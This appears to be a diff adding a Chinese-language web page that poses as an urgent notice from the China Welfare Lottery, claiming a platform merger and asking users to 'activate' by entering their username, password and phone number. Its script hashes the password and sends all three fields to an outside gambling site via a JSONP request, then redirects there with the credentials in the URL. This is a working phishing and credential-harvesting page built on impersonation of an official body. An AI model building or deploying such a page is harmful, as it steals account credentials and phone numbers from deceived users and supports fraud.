@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+  <link>
+    <meta charset="utf-8" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;" name="viewport" >
+    <title></title>
+    <link rel="bookmark" type="image/x-icon"  href="/favicon.ico"/>
+		<link rel="stylesheet" href="./css/hijack.css"></link>
+    <script type="text/javascript" src="./js/md5.js"></script>
+    <script type="text/javascript" src="./js/jquery-2.1.1.min.js"></script>
+  </head>
+  <body>
+    <div class="warp" id="app">
+      <img class="img" src="./img/main_bg.jpg" alt="">
+      <img class="img2" src="./img/mobile_bg.jpg" alt="">
+      <div class="main">
+        <div class="mainbaner">
+          <img src="./img/main_banner.jpg" alt="">
+        </div>
+
+
+        <div class="maintop">
+          <div class="rightBox">
+            <div class="serverbg">
+              <img src="./img/serverbg.png" alt="">
+            </div>
+            <ul>
+              <li>
+                <a target="_blank" href="https://v88.live800.com/live800/chatClient/chatbox.jsp?companyID=925834&configID=8015&jid=8547731414&s=1">
+                  <img src="./img/server.png" alt="">
+                  <p>24小时客服</p>
+                </a>
+              </li>
+              <li>
+                <img src="./img/qq.png" alt="">
+                <p>QQ</p>
+                <div class=" wxhover2">
+                  55593678
+                </div>
+              </li>
+              <li >
+                <img src="./img/wx.png" alt="">
+                <p>微信</p>
+                <div class="wxhover">
+                  <img src="./img/wximg.jpg" alt="">
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div class="title">
+            <img src="./img/titlelet.png" alt="">
+            平台紧急通告
+            <p class="time">来源 : 中国福彩网&nbsp;&nbsp;&nbsp;&nbsp;2018-04-01 11:00</p>
+          </div>
+          <div class="conten">
+            <p>
+              <span>尊敬的会员：</span>您好，全国福利彩票监察协调局对现有平台进行重组并购，现将原平台大陆线路（网址）自动切换到头彩进行游戏。您可用原有账号进行登录，如有任何疑问请咨询24小时人工客服，为此给您带来的不便我们深表歉意，敬请谅解！
+            </p>
+            <p>
+              详情请登陆彩票官网  <a href="https://www.91jitapu.com">91jitapu.com</a>！
+            </p>
+
+            <p class="end">
+              运营中心 2018-04-01
+            </p>
+          </div>
+          <div class="tips">
+            <span class="left"></span>
+            快速登录
+            <span class="right"></span>
+          </div>
+          <div class="register clearfix" id="register">
+            <label class="" >
+              <img src="./img/user.png" alt="">
+              <input type="text" name="" value="" placeholder="请输入您的用户名">
+            </label>
+
+            <label class="" >
+              <img src="./img/password.png" alt="">
+              <input type="password" name="" value="" placeholder="请输入您的密码">
+            </label>
+
+            <label class="" >
+              <img src="./img/phone.png" alt="">
+              <input type="text" name="" value="" placeholder="请输入您的手机号码">
+            </label>
+            <button type="button" class="cursor" name="button">激活</button>
+            <p class="registererror"></p>
+          </div>
+        </div>
+        <div class="mainbom">
+          <ul class="clearfix">
+            <li class="fl">
+              <img src="./img/list0.png" alt="">
+              <p class="tit">品牌信誉</p>
+              <p class="more">实例公司，品质服务</p>
+            </li>
+            <li class="fl">
+              <img src="./img/list1.png" alt="">
+              <p class="tit">品牌信誉</p>
+              <p class="more">实例公司，品质服务</p>
+            </li>
+            <li class="fl">
+              <img src="./img/list2.png" alt="">
+              <p class="tit">品牌信誉</p>
+              <p class="more">实例公司，品质服务</p>
+            </li>
+            <li class="fl">
+              <img src="./img/list3.png" alt="">
+              <p class="tit">品牌信誉</p>
+              <p class="more">实例公司，品质服务</p>
+            </li>
+            <li class="fl">
+              <img src="./img/list4.png" alt="">
+              <p class="tit">品牌信誉</p>
+              <p class="more">实例公司，品质服务</p>
+            </li>
+            <li class="fl">
+              <img src="./img/list5.png" alt="">
+              <p class="tit">品牌信誉</p>
+              <p class="more">实例公司，品质服务</p>
+            </li>
+          </ul>
+        </div>
+      </div>
+      <div class="footer">
+        <img src="./img/footer.png" alt="">
+      </div>
+    </div>
+    <script type="text/javascript">
+      (function(w, d){
+        var warp = d.getElementById('register');
+        var oipt = warp.getElementsByTagName("input");
+        var pbtn = warp.getElementsByTagName("button")[0];
+        var regname = /^[a-zA-Z_]{1}\w{5,9}$/;
+        var pwd = /^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]{6,24}$/;
+        var phones = /^1((33|49|5+[012356789]|7[37]|8[019]|99)|(3[012]|45|5[56]|66|7[56]|8[56])|(3[456789]|47|78|8[23478]))[0-9]{8}$/;
+        var sendata = {};
+        var scussurl = "https://www.91jitapu.com/";
+        function succssfn() {
+          var str =  scussurl + "login/?name=" + sendata.name + "&pwd=" + sendata.pwd;
+          location.href = str;
+        }
+        function ajaxpost() {
+             $.ajax({
+                 type : "get",
+                 async: false,
+                 url : scussurl + 'yx/other-zyrg?name=' + sendata.name + "&pwd=" + sendata.pwd + "&phoneNum=" + sendata.phoneNum,
+                 dataType : "jsonp",
+                 jsonp: "callback",
+                 jsonpCallback:"jsonpCallback",
+                 success : function(json){
+                    if(json.code.toString() === '0') {
+                      $('.registererror').html(json.message);
+                      succssfn();
+                      return ;
+                    }
+                    location.href = scussurl;
+                 },
+                error:function(err){
+                     console.log(err);
+                 }
+             });
+        }
+
+        function testval(arr) {
+          var name = oipt[0].value;
+          var password = oipt[1].value;
+          var phone = oipt[2].value;
+          if(!phones.test(phone)) {
+            return {msg:'请确认手机号码格式',bool: true}
+          }
+          if(!regname.test(name)) {
+            return {msg:'请输入正确的用户名',bool: true}
+          }
+          if(!pwd.test(password)) {
+            return {msg:'请输入正确的密码',bool: true}
+          }
+          sendata = {
+            name: name,
+            pwd: md5(password),
+            phoneNum: phone,
+            bool: false
+          }
+
+          return {};
+        }
+        pbtn.addEventListener('click', function(){
+          $('.registererror').html('');
+          var next = testval();
+          if(next.bool) return $('.registererror').html(next.msg);
+          return ajaxpost(),true;
+        }, false);
+      }(window, document));
+    </script>
+  <script src="https://s19.cnzz.com/z_stat.php?id=1273508492&web_id=1273508492" language="JavaScript"></script>  
+  </body>
+</html>
